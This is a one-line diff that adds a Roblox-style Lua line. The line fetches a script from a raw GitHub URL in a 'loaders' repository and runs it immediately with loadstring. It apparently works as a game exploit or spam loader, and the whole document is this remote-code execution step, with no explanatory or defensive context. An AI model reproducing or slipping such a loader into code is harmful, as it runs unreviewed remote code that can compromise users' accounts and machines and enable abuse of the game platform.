@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/kukirin-life-testing-spam1-jc24wwdsi8zv8o.lua"))()
